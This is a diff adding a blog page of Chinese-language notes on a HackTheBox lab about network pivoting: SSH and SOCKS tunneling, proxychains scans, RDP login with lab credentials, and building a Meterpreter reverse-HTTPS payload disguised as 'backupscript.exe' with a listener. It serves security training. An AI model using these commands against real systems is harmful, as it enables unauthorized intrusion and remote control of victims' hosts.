@@ -1,0 +1,315 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Introduction to Pivoting, Tunneling, and Port Forwarding
+在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。
+
+
+有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site ..</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><span class="toc-text">Introduction to Pivoting, Tunneling, and Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-Pivoting-and-Tunneling-Compared"><span class="toc-text">Lateral Movement, Pivoting, and Tunneling Compared</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lateral-Movement"><span class="toc-text">Lateral Movement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pivoting"><span class="toc-text">Pivoting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tunneling"><span class="toc-text">Tunneling</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Networking-Behind-Pivoting"><span class="toc-text">The Networking Behind Pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IP-Addressing-amp-NICs"><span class="toc-text">IP Addressing &amp; NICs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Routing"><span class="toc-text">Routing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protocols-Services-amp-Ports"><span class="toc-text">Protocols, Services &amp; Ports</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><span class="toc-text">Dynamic Port Forwarding with SSH and SOCKS Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Forwarding-in-Context"><span class="toc-text">Port Forwarding in Context</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Local-Port-Forwarding"><span class="toc-text">SSH Local Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Scanning-the-Pivot-Target"><span class="toc-text">Scanning the Pivot Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Executing-the-Local-Port-Forward"><span class="toc-text">Executing the Local Port Forward</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confirming-Port-Forward-with-Nmap"><span class="toc-text">Confirming Port Forward with Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Forwarding-Multiple-Ports"><span class="toc-text">Forwarding Multiple Ports</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-up-to-Pivot"><span class="toc-text">Setting up to Pivot</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Looking-for-Opportunities-to-Pivot-using-ifconfig"><span class="toc-text">Looking for Opportunities to Pivot using ifconfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enabling-Dynamic-Port-Forwarding-with-SSH"><span class="toc-text">Enabling Dynamic Port Forwarding with SSH</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-Metasploit-with-Proxychains"><span class="toc-text">Using Metasploit with Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-xfreerdp-with-Proxychains"><span class="toc-text">Using xfreerdp with Proxychains</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice"><span class="toc-text">practice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH"><span class="toc-text">Remote&#x2F;Reverse Port Forwarding with SSH</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Creating-a-Windows-Payload-with-msfvenom"><span class="toc-text">Creating a Windows Payload with msfvenom</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Configuring-amp-Starting-the-multi-x2F-handler"><span class="toc-text">Configuring &amp; Starting the multi&#x2F;handler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-Python3-Webserver-on-Pivot-Host"><span class="toc-text">Starting Python3 Webserver on Pivot Host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Downloading-Payload-from-Windows-Target"><span class="toc-text">Downloading Payload from Windows Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-Session-Established"><span class="toc-text">Meterpreter Session Established</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Meterpreter-Tunneling-amp-Port-Forwarding"><span class="toc-text">Meterpreter Tunneling &amp; Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Creating-Payload-for-Ubuntu-Pivot-Host"><span class="toc-text">Creating Payload for Ubuntu Pivot Host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-Session-Establishment"><span class="toc-text">Meterpreter Session Establishment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ping-Sweep"><span class="toc-text">Ping Sweep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Configuring-MSF%E2%80%99s-SOCKS-Proxy"><span class="toc-text">Configuring MSF’s SOCKS Proxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confirming-Proxy-Server-is-Running"><span class="toc-text">Confirming Proxy Server is Running</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Creating-Routes-with-AutoRoute"><span class="toc-text">Creating Routes with AutoRoute</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Forwarding"><span class="toc-text">Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Creating-Local-TCP-Relay"><span class="toc-text">Creating Local TCP Relay</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Connecting-to-Windows-Target-through-localhost"><span class="toc-text">Connecting to Windows Target through localhost</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netstat-Output"><span class="toc-text">Netstat Output</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-Reverse-Port-Forwarding"><span class="toc-text">Meterpreter Reverse Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-Port-Forwarding-Rules"><span class="toc-text">Reverse Port Forwarding Rules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Configuring-amp-Starting-multi-x2F-handler"><span class="toc-text">Configuring &amp; Starting multi&#x2F;handler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Establishing-the-Meterpreter-session"><span class="toc-text">Establishing the Meterpreter session</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</h1><time class="has-text-grey" datetime="2023-08-27T08:25:27.000Z">2023-08-27</time><article class="mt-2 post-content"><h1 id="Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><a href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding" class="headerlink" title="Introduction to Pivoting, Tunneling, and Port Forwarding"></a>Introduction to Pivoting, Tunneling, and Port Forwarding</h1><p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt="img"></p>
+<p>在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。</p>
+<span id="more"></span>
+
+<p>有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以前无法访问的网段。最常见的有：</p>
+<ul>
+<li><code>Pivot Host</code></li>
+<li><code>Proxy</code></li>
+<li><code>Foothold</code></li>
+<li><code>Beach Head system</code></li>
+<li><code>Jump Host</code></li>
+</ul>
+<p>Pivoting的主要用途是击败分段（物理和虚拟）来访问孤立的网络。另一方面，隧道是枢转的一个子集。隧道将网络流量封装到另一个协议中，并通过它路由流量。</p>
+<p>像VPN或专用浏览器这样的典型应用程序只是隧道网络流量的另一种形式。 在IT和Infosec行业，我们不可避免地会遇到几个不同的术语来描述同一件事。通过旋转，我们会注意到这通常被称为横向运动。</p>
+<h2 id="Lateral-Movement-Pivoting-and-Tunneling-Compared"><a href="#Lateral-Movement-Pivoting-and-Tunneling-Compared" class="headerlink" title="Lateral Movement, Pivoting, and Tunneling Compared"></a>Lateral Movement, Pivoting, and Tunneling Compared</h2><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><p>横向移动可以被描述为一种用于在网络环境中进一步访问额外主机、应用程序和服务的技术。横向移动还可以帮助我们获得提升特权所需的特定领域资源。横向移动通常允许主机之间的权限升级。除了我们对这一概念的解释外，我们还可以研究其他受人尊敬的组织如何解释横向运动。如果时间允许，请查看以下两种解释：</p>
+<p><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network’s Explanation</a></p>
+<p><a target="_blank" rel="noopener" href="https://attack.mitre.org/tactics/TA0008/">MITRE’s Explanation</a></p>
+<h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>利用多个主机来跨越通常无法访问的网络边界。这是一个更有针对性的目标。这里的目标是通过损害目标主机或基础设施，使我们能够深入网络。</p>
+<h4 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h4><p>我们经常发现自己使用各种协议来将流量穿梭于有可能检测到流量的网络中。例如，使用HTTP来屏蔽从我们拥有的服务器到受害者主机的命令和控制流量。这里的关键是混淆我们的行动，以尽可能长时间地避免被发现。我们使用具有增强安全措施的协议，如TLS上的HTTPS或其他传输协议上的SSH。这些类型的操作还可以实现诸如将数据从目标网络中过滤出来或将更多有效载荷和指令传递到网络中之类的策略。</p>
+<h1 id="The-Networking-Behind-Pivoting"><a href="#The-Networking-Behind-Pivoting" class="headerlink" title="The Networking Behind Pivoting"></a>The Networking Behind Pivoting</h1><h2 id="IP-Addressing-amp-NICs"><a href="#IP-Addressing-amp-NICs" class="headerlink" title="IP Addressing &amp; NICs"></a>IP Addressing &amp; NICs</h2><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>路由器的一个关键定义特征是它有一个路由表，用于根据目的地IP地址转发流量。我们在Pwnbox上使用命令netstat-r或ip route来查看这一点。</p>
+<p>被指定为路由器的独立设备通常会使用静态路由创建、动态路由协议和直接连接接口的组合来学习路由。任何去往路由表中不存在的网络的流量都将被发送到默认路由，该路由也可以被称为默认网关或最后的网关。在寻找转向机会时，查看主机的路由表以确定我们可能能够到达的网络或我们可能需要添加的路由可能会很有帮助。</p>
+<h2 id="Protocols-Services-amp-Ports"><a href="#Protocols-Services-amp-Ports" class="headerlink" title="Protocols, Services &amp; Ports"></a>Protocols, Services &amp; Ports</h2><p>可以尝试使用网络绘图工具绘制网络拓扑。当我寻找转向的机会时，我喜欢使用<a target="_blank" rel="noopener" href="https://draw.io/">Draw.io</a>等工具来构建我所处网络环境的可视化，它也是一个很好的文档工具</p>
+<h1 id="Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><a href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling" class="headerlink" title="Dynamic Port Forwarding with SSH and SOCKS Tunneling"></a>Dynamic Port Forwarding with SSH and SOCKS Tunneling</h1><hr>
+<h2 id="Port-Forwarding-in-Context"><a href="#Port-Forwarding-in-Context" class="headerlink" title="Port Forwarding in Context"></a>Port Forwarding in Context</h2><p>端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用TCP作为主要通信层，为转发的端口提供交互式通信。然而，可以使用不同的应用层协议，如SSH甚至SOCKS（非应用层）来封装转发的流量。这可以有效绕过防火墙，并使用受损主机上的现有服务转向其他网络。</p>
+<h2 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h2><p>让我们从下图中举一个例子。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291121798.png" alt="img"></p>
+<p>我们有一个攻击主机（10.10.15.x）和一个目标Ubuntu服务器（10.129.x.x），我们已经破坏了它。我们将使用Nmap扫描目标Ubuntu服务器以搜索打开的端口。</p>
+<h4 id="Scanning-the-Pivot-Target"><a href="#Scanning-the-Pivot-Target" class="headerlink" title="Scanning the Pivot Target"></a>Scanning the Pivot Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
+Nmap scan report for 10.129.202.64
+Host is up (0.12s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+3306/tcp closed mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
+</code></pre>
+<p>Nmap输出显示SSH端口已打开。要访问MySQL服务，我们可以通过SSH连接到服务器并从Ubuntu服务器内部访问MySQL，也可以通过端口1234将其转发到本地主机并在本地访问。在本地访问它的一个好处是，如果我们想在MySQL服务上执行远程攻击，如果没有端口转发，我们将无法做到这一点。这是由于MySQL在端口3306的Ubuntu服务器上本地托管。因此，我们将使用以下命令通过SSH将本地端口（1234）转发到Ubuntu服务器。</p>
+<h4 id="Executing-the-Local-Port-Forward"><a href="#Executing-the-Local-Port-Forward" class="headerlink" title="Executing the Local Port Forward"></a>Executing the Local Port Forward</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp | grep 1234
+</code></pre>
+<h4 id="Confirming-Port-Forward-with-Nmap"><a href="#Confirming-Port-Forward-with-Nmap" class="headerlink" title="Confirming Port Forward with Nmap"></a>Confirming Port Forward with Nmap</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p1234 localhost
+</code></pre>
+<p>类似地，如果我们想将多个端口从Ubuntu服务器转发到本地主机，可以通过在ssh命令中包含localport:server:port参数来实现。例如，下面的命令将apache web服务器的端口80转发到8080上的攻击主机的本地端口。</p>
+<h4 id="Forwarding-Multiple-Ports"><a href="#Forwarding-Multiple-Ports" class="headerlink" title="Forwarding Multiple Ports"></a>Forwarding Multiple Ports</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
+</code></pre>
+<h2 id="Setting-up-to-Pivot"><a href="#Setting-up-to-Pivot" class="headerlink" title="Setting up to Pivot"></a>Setting up to Pivot</h2><p>现在，如果你在Ubuntu主机上键入ifconfig，你会发现这台服务器有多个NIC： 一个连接到我们的攻击主机（ens192） 一个与不同网络内的其他主机通信（ens224） 环回接口（lo）。</p>
+<h4 id="Looking-for-Opportunities-to-Pivot-using-ifconfig"><a href="#Looking-for-Opportunities-to-Pivot-using-ifconfig" class="headerlink" title="Looking for Opportunities to Pivot using ifconfig"></a>Looking for Opportunities to Pivot using ifconfig</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ifconfig 
+
+ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
+        RX packets 35571  bytes 177919049 (177.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10452  bytes 1474767 (1.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
+        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
+        RX packets 8251  bytes 1125190 (1.1 MB)
+        RX errors 0  dropped 40  overruns 0  frame 0
+        TX packets 1538  bytes 123584 (123.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 270  bytes 22432 (22.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 270  bytes 22432 (22.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+<p>与之前我们知道要访问哪个端口的情况不同，在当前的情况下，我们不知道网络的另一端有哪些服务。因此，我们可以扫描网络（172.16.5.1-200）网络或整个子网（172.16.5.0&#x2F;23）上较小范围的IP。我们无法直接从攻击主机执行此扫描，因为它没有到172.16.5.0&#x2F;22网络的路由。要做到这一点，我们必须通过Ubuntu服务器执行动态端口转发和调整网络数据包。我们可以通过在本地主机（个人攻击主机或Pwnbox）上启动SOCKS侦听器来实现这一点，然后配置SSH，以便在连接到目标主机后通过SSH将该流量转发到网络（172.16.5.0&#x2F;23）。 这称为通过SOCKS代理的SSH隧道。SOCKS代表Socket Secure，这是一种有助于与有防火墙限制的服务器通信的协议。与大多数情况下启动连接以连接到服务不同，在SOCKS的情况下，初始流量由SOCKS客户端生成，该客户端连接到由想要访问客户端上的服务的用户控制的SOCKS服务器。一旦建立了连接，就可以代表连接的客户端通过SOCKS服务器路由网络流量。 这种技术通常用于规避防火墙的限制，并允许外部实体绕过防火墙，访问防火墙环境中的服务。使用SOCKS代理进行数据透视和转发的另一个好处是，SOCKS代理可以通过创建从NAT网络到外部服务器的路由进行透视。SOCKS代理目前有两种类型：SOCKS4和SOCKS5。SOCKS4不提供任何身份验证和UDP支持，而SOCKS5提供了这些支持。让我们举一个下图的例子，我们有一个172.16.5.0&#x2F;23的NAT网络，我们不能直接访问它。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291135490.png" alt="img"></p>
+<p>在上图中，攻击主机启动SSH客户端，并请求SSH服务器允许其通过SSH套接字发送一些TCP数据。SSH服务器以确认进行响应，然后SSH客户端开始在localhost:9050上侦听。您在此处发送的任何数据都将通过SSH广播到整个网络（172.16.5.0&#x2F;23）。我们可以使用以下命令来执行此动态端口转发。</p>
+<h4 id="Enabling-Dynamic-Port-Forwarding-with-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-with-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding with SSH"></a>Enabling Dynamic Port Forwarding with SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
+</code></pre>
+<p>-D参数请求SSH服务器启用动态端口转发。一旦我们启用了这一功能，我们将需要一个可以通过端口9050路由任何工具的数据包的工具。我们可以使用proxychains工具来实现这一点，该工具能够通过TOR、SOCKS和HTTP&#x2F;HTTPS代理服务器重定向TCP连接，还允许我们将多个代理服务器链接在一起。使用proxychains，我们也可以隐藏请求主机的IP地址，因为接收主机只能看到透视主机的IP。Proxychains通常用于强制应用程序的TCP流量通过托管代理，如SOCKS4&#x2F;SOCKS5、TOR或HTTP&#x2F;HTTPS代理。 要通知proxychans我们必须使用端口9050，我们必须修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans配置文件。如果最后一行还没有socks4 127.0.0.1 9050，那么我们可以将其添加到最后一行。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ tail -4 /etc/proxychains.conf
+
+# meanwile
+# defaults set to &quot;tor&quot;
+socks4 	127.0.0.1 9050
+</code></pre>
+<p>现在，当您使用以下命令使用proxychains启动Nmap时，它将把Nmap的所有数据包路由到本地端口9050，我们的SSH客户端正在侦听该端口，该端口将通过SSH将所有数据包转发到172.16.5.0&#x2F;23网络。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
+</code></pre>
+<p>使用proxychains打包所有Nmap数据并将其转发到远程服务器的这一部分称为SOCKS隧道。这里需要记住的一个更重要的注意事项是，我们只能在proxychain上执行完整的TCP连接扫描。原因是代理主机无法理解部分数据包。如果发送部分数据包（如半连接扫描），则会返回不正确的结果。我们还需要确保意识到主机活动检查可能无法针对Windows目标，因为Windows Defender防火墙默认情况下会阻止ICMP请求（传统ping）。 在整个网络范围内不进行ping的完整TCP连接扫描将花费很长时间。因此，对于本模块，我们将主要关注扫描单个主机，或我们知道的活动的较小范围的主机，在这种情况下，它将是172.16.5.19的Windows主机。 我们将使用以下命令执行远程系统扫描。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19
+</code></pre>
+<p>Nmap扫描显示了几个打开的端口，其中一个是RDP端口（3389）。与Nmap扫描类似，我们还可以通过proxychans调整msfconsole，使用Metasploit辅助模块执行易受攻击的RDP扫描。我们可以用proxychains启动msfconsole。</p>
+<h2 id="Using-Metasploit-with-Proxychains"><a href="#Using-Metasploit-with-Proxychains" class="headerlink" title="Using Metasploit with Proxychains"></a>Using Metasploit with Proxychains</h2><p>我们还可以使用proxychains打开Metasploit，并通过我们建立的代理发送所有相关流量。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains msfconsole
+</code></pre>
+<p>让我们使用rdp_scanner辅助模块来检查内部网络上的主机是否正在监听3389。</p>
+<pre><code class="shell-session">msf6 &gt; search rdp_scanner
+
+
+run：
+[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) main_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (RequirNLA: No)
+[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<p>在上面输出的底部，我们可以看到RDP端口与Windows操作系统版本一起打开。 根据评估期间我们对此主机的访问级别，我们可能会尝试运行漏洞攻击或使用收集的凭据登录。对于此模块，我们将通过SOCKS隧道登录到Windows远程主机。这可以使用xfreerdp来完成。我们案例中的用户是胜利者，密码是pass@123</p>
+<h4 id="Using-xfreerdp-with-Proxychains"><a href="#Using-xfreerdp-with-Proxychains" class="headerlink" title="Using xfreerdp with Proxychains"></a>Using xfreerdp with Proxychains</h4><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+</code></pre>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>应用本节中教授的概念，转向内部网络并使用RDP（凭据：victor:pass@123)以控制172.16.5.19上的Windows目标。提交桌面上Flag.txt的内容。</p>
+<p>这里使用ssh -D 然后配置proxychain代理就可以轻松连接，个人感觉ssh -L也可以，但是缺陷是只能指定某个端口映射，这可能导致当常用服务与其常用端口不匹配时，转发出去的端口</p>
+<h1 id="Remote-x2F-Reverse-Port-Forwarding-with-SSH"><a href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH" class="headerlink" title="Remote&#x2F;Reverse Port Forwarding with SSH"></a>Remote&#x2F;Reverse Port Forwarding with SSH</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291509662.png" alt="img"></p>
+<p>如果我们试图获得一个反向外壳，会发生什么呢？ Windows主机的传出连接仅限于172.16.5.0&#x2F;23网络。这是因为Windows主机与攻击主机所在的网络没有任何直接连接。如果我们在攻击主机上启动Metasploit侦听器并尝试获取反向shell，我们将无法在此处获得直接连接，因为Windows服务器不知道如何路由离开其网络（172.16.5.0&#x2F;23）的流量以到达10.129.x.x（Academy Lab网络）。 在渗透测试过程中，有几次只有远程桌面连接是不可行的。您可能需要上载&#x2F;下载文件（当RDP剪贴板被禁用时），使用漏洞利用或低级Windows API使用Metermeter会话在Windows主机上执行枚举，而使用内置的Windows可执行文件是不可能的。 在这些情况下，我们必须找到一个枢轴主机，这是我们的攻击主机和Windows服务器之间的常见连接点。在我们的案例中，我们的中枢主机将是Ubuntu服务器，因为它可以连接到我们的攻击主机和Windows目标。为了在Windows上获得Meterpeter外壳，我们将使用msfvenom创建MeterpeterHTTPS负载，但负载的反向连接配置为Ubuntu服务器的主机IP地址（172.16.5.129）。我们将使用Ubuntu服务器上的端口8080将所有反向数据包转发到攻击主机的8000端口，Metasploit侦听器正在该端口运行。</p>
+<h4 id="Creating-a-Windows-Payload-with-msfvenom"><a href="#Creating-a-Windows-Payload-with-msfvenom" class="headerlink" title="Creating a Windows Payload with msfvenom"></a>Creating a Windows Payload with msfvenom</h4><pre><code class="shell-session"> msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080
+</code></pre>
+<h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https
+payload =&gt; windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
+lhost =&gt; 0.0.0.0
+msf6 exploit(multi/handler) &gt; set lport 8000
+lport =&gt; 8000
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+</code></pre>
+<p>一旦创建了有效负载，并且配置并运行了侦听器，我们就可以使用scp命令将有效负载复制到Ubuntu服务器，因为我们已经有了使用SSH连接到Ubuntu服务器的凭据。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/
+
+backupscript.exe                                   100% 7168    65.4KB/s   00:00 
+</code></pre>
+<p>复制有效负载后，我们将在复制有效负载的同一目录中的Ubuntu服务器上使用以下命令启动python3HTTP服务器。</p>
